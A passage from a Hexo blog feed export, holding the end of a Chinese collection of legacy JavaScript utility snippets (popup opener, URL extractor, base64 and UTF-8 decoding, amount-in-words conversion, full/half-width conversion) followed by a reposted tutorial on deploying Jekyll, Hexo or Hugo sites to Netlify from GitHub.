<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">openWindow</span>(<span class="params">url,windowName,width,height</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="built_in">parseInt</span>(screen.width / <span class="number">2.0</span>) - (width / <span class="number">2.0</span>); </span><br><span class="line">    <span class="keyword">var</span> y = <span class="built_in">parseInt</span>(screen.height / <span class="number">2.0</span>) - (height / <span class="number">2.0</span>);</span><br><span class="line">    <span class="keyword">var</span> isMSIE= (navigator.appName == <span class="string">"Microsoft Internet Explorer"</span>);</span><br><span class="line">    <span class="keyword">if</span> (isMSIE) &#123;</span><br><span class="line">        <span class="keyword">var</span> p = <span class="string">"resizable=1,location=no,scrollbars=no,width="</span>;</span><br><span class="line">        p = p+width;</span><br><span class="line">           p = p+<span class="string">",height="</span>;</span><br><span class="line">           p = p+height;</span><br><span class="line">        p = p+<span class="string">",left="</span>;</span><br><span class="line">        p = p+x;</span><br><span class="line">        p = p+<span class="string">",top="</span>;</span><br><span class="line">        p = p+y;</span><br><span class="line">        retval = <span class="built_in">window</span>.open(url, windowName, p);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> win = <span class="built_in">window</span>.open(url, <span class="string">"ZyiisPopup"</span>, <span class="string">"top="</span> + y + <span class="string">",left="</span> + x + <span class="string">",scrollbars="</span> + scrollbars + <span class="string">",dialog=yes,modal=yes,width="</span> + width + <span class="string">",height="</span> + height + <span class="string">",resizable=no"</span> );</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">"try &#123; win.resizeTo(width, height); &#125; catch(e) &#123; &#125;"</span>);</span><br><span class="line">        win.focus();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="提取页面代码中所有网址"><a class="markdownIt-Anchor" href="#提取页面代码中所有网址"></a> 提取页面代码中所有网址</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> aa = <span class="built_in">document</span>.documentElement.outerHTML.match(<span class="regexp">/(url\(|src=|href=)[\"\']*([^\"\'\(\)\&lt;\&gt;\[\] ]+)[\"\'\)]*|(http:\/\/[\w\-\.]+[^\"\'\(\)\&lt;\&gt;\[\] ]+)/ig</span>).join(<span class="string">"\r\n"</span>).replace(<span class="regexp">/^(src=|href=|url\()[\"\']*|[\"\'\&gt;\) ]*$/igm</span>,<span class="string">""</span>);</span><br><span class="line">alert(aa);</span><br></pre></td></tr></table></figure>
<h3 id="清除html代码中的脚本"><a class="markdownIt-Anchor" href="#清除html代码中的脚本"></a> 清除html代码中的脚本</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear_script</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    K1.value=K1.value.replace(<span class="regexp">/&lt;script.*?&gt;[\s\S]*?&lt;\/script&gt;|\s+on[a-zA-Z]&#123;3,16&#125;\s?=\s?"[\s\S]*?"|\s+on[a-zA-Z]&#123;3,16&#125;\s?=\s?'[\s\S]*?'|\s+on[a-zA-Z]&#123;3,16&#125;\s?=[^ &gt;]+/ig</span>,<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line">动态执行JavaScript脚本</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">javascript</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="built_in">eval</span>(K1.value);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      alert(e.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态执行vbscript脚本"><a class="markdownIt-Anchor" href="#动态执行vbscript脚本"></a> 动态执行VBScript脚本</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">vbscript</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script=<span class="built_in">document</span>.getElementById(<span class="string">"K1"</span>).value;</span><br><span class="line">        <span class="keyword">if</span>(script.trim()==<span class="string">""</span>)<span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">window</span>.execScript(<span class="string">'On Error Resume Next \n'</span>+script+<span class="string">'\n If Err.Number&lt;&gt;0 Then \n MsgBox "请输入正确的VBScript脚本!",48,"脚本错误!" \n End If'</span>,<span class="string">"vbscript"</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        alert(e.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="金额大写转换函数"><a class="markdownIt-Anchor" href="#金额大写转换函数"></a> 金额大写转换函数</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transform</span>(<span class="params">tranvalue</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">var</span> dw2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">""</span>, <span class="string">"万"</span>, <span class="string">"亿"</span>); <span class="comment">//大单位</span></span><br><span class="line">        <span class="keyword">var</span> dw1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"拾"</span>, <span class="string">"佰"</span>, <span class="string">"仟"</span>); <span class="comment">//小单位</span></span><br><span class="line">        <span class="keyword">var</span> dw = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"零"</span>, <span class="string">"壹"</span>, <span class="string">"贰"</span>, <span class="string">"叁"</span>, <span class="string">"肆"</span>, <span class="string">"伍"</span>, <span class="string">"陆"</span>, <span class="string">"柒"</span>, <span class="string">"捌"</span>, <span class="string">"玖"</span>); <span class="comment">//整数部分用</span></span><br><span class="line">        <span class="comment">//以下是小写转换成大写显示在合计大写的文本框中     </span></span><br><span class="line">        <span class="comment">//分离整数与小数</span></span><br><span class="line">        <span class="keyword">var</span> source = splits(tranvalue);</span><br><span class="line">        <span class="keyword">var</span> num = source[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> dig = source[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">//转换整数部分</span></span><br><span class="line">        <span class="keyword">var</span> k1 = <span class="number">0</span>; <span class="comment">//计小单位</span></span><br><span class="line">        <span class="keyword">var</span> k2 = <span class="number">0</span>; <span class="comment">//计大单位</span></span><br><span class="line">        <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">var</span> len = source[<span class="number">0</span>].length; <span class="comment">//整数的长度</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">              <span class="keyword">var</span> n = source[<span class="number">0</span>].charAt(len - i); <span class="comment">//取得某个位数上的数字</span></span><br><span class="line">              <span class="keyword">var</span> bn = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> (len - i - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                bn = source[<span class="number">0</span>].charAt(len - i - <span class="number">1</span>); <span class="comment">//取得某个位数前一位上的数字</span></span><br><span class="line">              &#125;</span><br><span class="line">              sum = sum + <span class="built_in">Number</span>(n);</span><br><span class="line">              <span class="keyword">if</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">                str = dw[<span class="built_in">Number</span>(n)].concat(str); <span class="comment">//取得该数字对应的大写数字，并插入到str字符串的前面</span></span><br><span class="line">                <span class="keyword">if</span> (n == <span class="string">'0'</span>) sum = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (len - i - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123; <span class="comment">//在数字范围内</span></span><br><span class="line">                <span class="keyword">if</span> (k1 != <span class="number">3</span>) &#123; <span class="comment">//加小单位</span></span><br><span class="line">                      <span class="keyword">if</span> (bn != <span class="number">0</span>) &#123;</span><br><span class="line">                        str = dw1[k1].concat(str);</span><br><span class="line">                      &#125;</span><br><span class="line">                      k1++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">//不加小单位，加大单位</span></span><br><span class="line">                      k1 = <span class="number">0</span>;</span><br><span class="line">                      <span class="keyword">var</span> temp = str.charAt(<span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">if</span> (temp == <span class="string">"万"</span> || temp == <span class="string">"亿"</span>) <span class="comment">//若大单位前没有数字则舍去大单位</span></span><br><span class="line">                      str = str.substr(<span class="number">1</span>, str.length - <span class="number">1</span>);</span><br><span class="line">                      str = dw2[k2].concat(str);</span><br><span class="line">                      sum = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (k1 == <span class="number">3</span>)&#123; <span class="comment">//小单位到千则大单位进一</span></span><br><span class="line">                k2++;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转换小数部分</span></span><br><span class="line">        <span class="keyword">var</span> strdig = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span> (dig != <span class="string">""</span>) &#123;</span><br><span class="line">              <span class="keyword">var</span> n = dig.charAt(<span class="number">0</span>);</span><br><span class="line">              <span class="keyword">if</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">                strdig += dw[<span class="built_in">Number</span>(n)] + <span class="string">"角"</span>; <span class="comment">//加数字</span></span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">var</span> n = dig.charAt(<span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">                strdig += dw[<span class="built_in">Number</span>(n)] + <span class="string">"分"</span>; <span class="comment">//加数字</span></span><br><span class="line">              &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        str += <span class="string">"元"</span> + strdig;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0元"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拆分整数与小数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params">tranvalue</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">''</span>, <span class="string">''</span>);</span><br><span class="line">    temp = tranvalue.split(<span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; temp.length; i++) &#123;</span><br><span class="line">        value = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="resize的操作"><a class="markdownIt-Anchor" href="#resize的操作"></a> resize的操作</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> w = <span class="built_in">document</span>.documentElement ? <span class="built_in">document</span>.documentElement.clientWidth : <span class="built_in">document</span>.body.clientWidth</span><br><span class="line">                    ,r = <span class="number">1255</span></span><br><span class="line">                    ,b = Element.extend(<span class="built_in">document</span>.body)</span><br><span class="line">                    ,classname = b.className;</span><br><span class="line">            <span class="keyword">if</span>(w &lt; r)&#123;</span><br><span class="line">                    <span class="comment">//当窗体的宽度小于1255的时候执行相应的操作</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//当窗体的宽度大于1255的时候执行相应的操作</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.addEventListener)&#123;</span><br><span class="line">            <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; fn(); &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.attachEvent)&#123;</span><br><span class="line">            <span class="built_in">window</span>.attachEvent(<span class="string">'onresize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; fn(); &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    fn();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<h3 id="实现base64解码"><a class="markdownIt-Anchor" href="#实现base64解码"></a> 实现base64解码</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64_decode</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b64 = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span>;</span><br><span class="line">    <span class="keyword">var</span> o1, o2, o3, h1, h2, h3, h4, bits, i = <span class="number">0</span>,ac = <span class="number">0</span>,dec = <span class="string">""</span>,tmp_arr = [];</span><br><span class="line">    <span class="keyword">if</span> (!data) &#123; <span class="keyword">return</span> data; &#125;</span><br><span class="line">    data += <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123; </span><br><span class="line">            h1 = b64.indexOf(data.charAt(i++));</span><br><span class="line">            h2 = b64.indexOf(data.charAt(i++));</span><br><span class="line">            h3 = b64.indexOf(data.charAt(i++));</span><br><span class="line">            h4 = b64.indexOf(data.charAt(i++));</span><br><span class="line">            bits = h1 &lt;&lt; <span class="number">18</span> | h2 &lt;&lt; <span class="number">12</span> | h3 &lt;&lt; <span class="number">6</span> | h4;</span><br><span class="line">            o1 = bits &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">            o2 = bits &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">            o3 = bits &amp; <span class="number">0xff</span>;</span><br><span class="line">            <span class="keyword">if</span> (h3 == <span class="number">64</span>) &#123;</span><br><span class="line">                    tmp_arr[ac++] = <span class="built_in">String</span>.fromCharCode(o1);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (h4 == <span class="number">64</span>) &#123;</span><br><span class="line">                    tmp_arr[ac++] = <span class="built_in">String</span>.fromCharCode(o1, o2);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    tmp_arr[ac++] = <span class="built_in">String</span>.fromCharCode(o1, o2, o3);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i &lt; data.length);</span><br><span class="line">    dec = tmp_arr.join(<span class="string">''</span>);</span><br><span class="line">    dec = utf8_decode(dec);</span><br><span class="line">    <span class="keyword">return</span> dec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实现utf8解码"><a class="markdownIt-Anchor" href="#实现utf8解码"></a> 实现utf8解码</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">utf8_decode</span>(<span class="params">str_data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tmp_arr = [],i = <span class="number">0</span>,ac = <span class="number">0</span>,c1 = <span class="number">0</span>,c2 = <span class="number">0</span>,c3 = <span class="number">0</span>;str_data += <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; str_data.length) &#123;</span><br><span class="line">            c1 = str_data.charCodeAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c1 &lt; <span class="number">128</span>) &#123;</span><br><span class="line">                    tmp_arr[ac++] = <span class="built_in">String</span>.fromCharCode(c1);</span><br><span class="line">                    i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c1 &gt; <span class="number">191</span> &amp;&amp; c1 &lt; <span class="number">224</span>) &#123;       </span><br><span class="line">                    c2 = str_data.charCodeAt(i + <span class="number">1</span>);</span><br><span class="line">                    tmp_arr[ac++] = <span class="built_in">String</span>.fromCharCode(((c1 &amp; <span class="number">31</span>) &lt;&lt; <span class="number">6</span>) | (c2 &amp; <span class="number">63</span>));</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c2 = str_data.charCodeAt(i + <span class="number">1</span>);</span><br><span class="line">                    c3 = str_data.charCodeAt(i + <span class="number">2</span>);</span><br><span class="line">                    tmp_arr[ac++] = <span class="built_in">String</span>.fromCharCode(((c1 &amp; <span class="number">15</span>) &lt;&lt; <span class="number">12</span>) | ((c2 &amp; <span class="number">63</span>) &lt;&lt; <span class="number">6</span>) | (c3 &amp; <span class="number">63</span>));</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> tmp_arr.join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取窗体可见范围的宽与高"><a class="markdownIt-Anchor" href="#获取窗体可见范围的宽与高"></a> 获取窗体可见范围的宽与高</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getViewSize</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> de=<span class="built_in">document</span>.documentElement;</span><br><span class="line">    <span class="keyword">var</span> db=<span class="built_in">document</span>.body;</span><br><span class="line">    <span class="keyword">var</span> viewW=de.clientWidth==<span class="number">0</span> ?  db.clientWidth : de.clientWidth;</span><br><span class="line">    <span class="keyword">var</span> viewH=de.clientHeight==<span class="number">0</span> ?  db.clientHeight : de.clientHeight;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>(viewW ,viewH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="断鼠标是否移出事件"><a class="markdownIt-Anchor" href="#断鼠标是否移出事件"></a> 断鼠标是否移出事件</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isMouseOut</span>(<span class="params">e, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (e.type !== <span class="string">'mouseout'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> reltg = e.relatedTarget ? e.relatedTarget : e.type === <span class="string">'mouseout'</span> ? e.toElement : e.fromElement;</span><br><span class="line">    <span class="keyword">while</span> (reltg &amp;&amp; reltg !== handler) &#123;</span><br><span class="line">            reltg = reltg.parentNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (reltg !== handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="半角转换为全角函数"><a class="markdownIt-Anchor" href="#半角转换为全角函数"></a> 半角转换为全角函数</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ToDBC</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">        code = str.charCodeAt(i);</span><br><span class="line">        <span class="keyword">if</span>(code &gt;= <span class="number">33</span> &amp;&amp; code &lt;= <span class="number">126</span>)&#123;</span><br><span class="line">              result += <span class="built_in">String</span>.fromCharCode(str.charCodeAt(i) + <span class="number">65248</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">32</span>)&#123;</span><br><span class="line">              result += <span class="built_in">String</span>.fromCharCode(str.charCodeAt(i) + <span class="number">12288</span> - <span class="number">32</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              result += str.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="全角转换为半角函数"><a class="markdownIt-Anchor" href="#全角转换为半角函数"></a> 全角转换为半角函数</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ToCDB</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">        code = str.charCodeAt(i);</span><br><span class="line">        <span class="keyword">if</span>(code &gt;= <span class="number">65281</span> &amp;&amp; code &lt;= <span class="number">65374</span>)&#123;</span><br><span class="line">              result += <span class="built_in">String</span>.fromCharCode(str.charCodeAt(i) - <span class="number">65248</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">12288</span>)&#123;</span><br><span class="line">              result += <span class="built_in">String</span>.fromCharCode(str.charCodeAt(i) - <span class="number">12288</span> + <span class="number">32</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              result += str.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Snippet</tag>
      </tags>
  </entry>
  <entry>
    <title>Netlify 自动编译部署生成 Web 网站</title>
    <url>/hexolog/post/31808.html</url>
    <content><![CDATA[<p><a href="https://www.freehao123.com/netlify/" target="_blank" rel="noopener">转载自-freehao123.com</a></p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_00.gif" alt="Netlify优秀的静态博客托管平台-自动编译部署生成Web网站可绑域名支持SSL" /></p>
<p>最近因为Coding对免费用户的pages服务强加跳转提示广告，让不少人不得不将自己的博客迁回Github。但是<a href="https://github.com/" target="_blank" rel="noopener">Github</a>也有一些无法克服的缺陷：一是访问速度不是很稳定；二是想上SSL只能通过CloudFlare实现。并且CloudFlare访问速度和稳定性都不太好。</p>
<p>今天推荐的netlify则是国外一家提供静态网络托管服务的综合平台，专注于静态网站托管的web服务平台，可以完美的取代Coding。 Netlify完美且免费支持的ssl、域名绑定、http/2和TLS。最重要的就是，管理方式用git方法传递给github、gitlab或者是Bitbucket，然后Netlify就能自动编译并生成静态网站。</p>
<p>对于想要使用Jekyll、<a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>、Hugo等静态搭建网站，又害怕复杂的本地环境配置的朋友，Netlify支持自动编译Jekyll、<a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>、Hugo等常见的静态博客程序真得是太方便了。另外，Netlify也是一个非常好的静态空间，如果你有用<a href="http://www.chole.io/" target="_blank" rel="noopener">纸小墨 inkPaper</a>或者Html网页，直接就可以上传发布到空间上了。</p>
<a id="more"></a>
<p>如果你喜欢静态网站和博客，你可以试试以下方法：</p>
<p><strong>Netlify优秀的静态博客托管平台-自动编译部署生成Web网站可绑域名支持SSL</strong></p>
<p><strong>一、 Netlify使用前准备：熟悉Github和Git</strong></p>
<p>1、Github官网：</p>
<ul>
<li>1、官方网站：<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a></li>
</ul>
<p>2、Netlify代码来自于Github、Gitlab或者BitBucket，所以你需要请先在Github、Gitlab或者BitBucket上建立一个代码库，并将自己的网页内容git上传到这个代码库中。Github建库，请看这篇文章：<a href="https://www.freehao123.com/github-farbox-dropbox/#toc-1" target="_blank" rel="noopener">Github空间在线写文章</a>。</p>
<p>3、用过Github空间的朋友，都知道Github上的Repos都是公共的，除非你愿意付费，否则你放在Github上的代码都能被所有人下载到。而Bitbucket的免费版本的用户可以有无限的私有Repos。如果想要使用Bitbucket，参考：<a href="https://bitbucket.org/" target="_blank" rel="noopener">Bitbucket免费代码托管空间</a>。</p>
<p>**4、Git使用。**Git是目前世界上最先进的分布式版本控制系统，有愿意使用静态的博客的朋友建议系统学习一下Git。如果你只时想要建立一个静态博客，也可以使用Github Desktop，它可以让你像管理FTP那样上传更新代码，新手朋友再也不用害怕命令了。</p>
<p><strong>二、申请Netlify免费空间</strong></p>
<p>1、Netlify官网：</p>
<ul>
<li>1、官方首页：<a href="https://www.netlify.com/" target="_blank" rel="noopener">https://www.netlify.com/</a></li>
</ul>
<p>2、 首先是到netlify申请注册一个账号。这里可以使用Github、Gitlab以及Bitbucket直接授权登陆。然后登录到空间管理中心，点击右上角的&quot;New site from Git&quot;添加网站。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_01.gif" alt="Netlify添加新的网站" /></p>
<p>3、然后根据自己的托管平台，可以选择GitHub、GitLab或者BitBucket。我们以最常用的GitHub为演示例子。（选择GitHub的同学，别忘了勾选下方的&quot;Limit GitHub access to public repositories.&quot;选项）</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_02-530x300.gif" alt="Netlify登录到Github" /></p>
<p>4、点击GitHub之后会弹出一个让你授权的窗口，然后点击&quot;Authorize netlify&quot;之后，就会在netlify中读取你所有的代码库。 （点击放大）</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_03-530x300.gif" alt="Netlify授权登录账号" /></p>
<p>5、 点击你已经建好的库，选好分支（默认master即可），然后点击&quot;Deploy site&quot;，系统就会自动编译你的静态页面了。同时还会给出你的页面二级域名等信息。（点击放大）</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_05-530x300.gif" alt="Netlify确认编译" /></p>
<p>6、点击创建后，稍等一会儿，你就可以看到Netlify免费静态空间已经创建成功了，同时你在GitHub的代码也成功在Netlify运行了。 （点击放大）</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_05_1-530x300.gif" alt="Netlify创建成功" /></p>
<p><strong>三、快速在Netlify建立Jekyll、Hexo、Hugo静态博客</strong></p>
<p>1、开源静态博客程序网站：</p>
<ul>
<li>1、网站首页：<a href="https://www.staticgen.com/" target="_blank" rel="noopener">https://www.staticgen.com/</a></li>
</ul>
<p>2、StaticGen是Netlify旗下另一个开源的静态博客程序网站，这里汇集了大部分开源的静态博客程序，而Jekyll、Hexo、Hugo等几款常见的博客程序则可以一键部署到Netlify空间上。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_06-530x300.gif" alt="Netlify一键部署" /></p>
<p>3、这里以Hexo为例，点击后跳转到Netlify页面，登录你的Github账号。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_07.gif" alt="Netlify跳转到登录" /></p>
<p>4、命令一个新的项目名称。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_08.gif" alt="Netlify命名一个项目" /></p>
<p>5、稍等一会儿，Netlify就会自动编译好Hexo博客，完成后如下图所示，你可以直接访问它给的二级域名了：（点击放大）</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_09-530x300.gif" alt="Netlify完成博客创建" /></p>
<p><strong>四、Netlify文件管理-用GitHub Desktop图形化管理Github</strong></p>
<p>1、Netlify文件管理直接通过Git提交修改到Github，然后Netlify就会自动执行编译和部署了。不想使用Git的朋友，可以使用GitHub Desktop软件来管理Github空间代码。</p>
<p>3、GitHub Desktop安装后，使用你的Github账号登录，然后你就可以开始下载、修改和上传代码文件了。这个就是GitHub Desktop软件界面了。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_10-530x300.gif" alt="GitHub Desktop管理界面" /></p>
<p>4、以修改Hexo主题为例，首先找到一个漂亮的Hexo主题，从Github打包下载下来。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_12.gif" alt="GitHub Desktop下载主题" /></p>
<p>5、然后将你在Github与Netlify连接创建好的项目通过GitHub Desktop下载到本地，进入到theme文件夹中。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_11.gif" alt="GitHub Desktop本地文件" /></p>
<p>6、将下载下来的Hexo主题文件解压放在theme文件夹中。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_13.gif" alt="GitHub Desktop进入主题文件夹" /></p>
<p>7、然后，修改配置文件_config.yml，将里面theme修改为你的主题，保存。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_16.gif" alt="GitHub Desktop修改配置文件" /></p>
<p>8、现在打开GitHub Desktop软件，你会在Changes中看到文件变化，提示你提交变化。（点击放大）</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_14-530x300.gif" alt="GitHub Desktop提示变化" /></p>
<p>9、输入描述，点击提交。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_15.gif" alt="GitHub Desktop确定提交" /></p>
<p>10、点击GitHub Desktop右上角的同步按钮，将文件上传到GitHub中，稍等一会儿，你就可以在Netlify那边也看到代码执行后的结果了。</p>
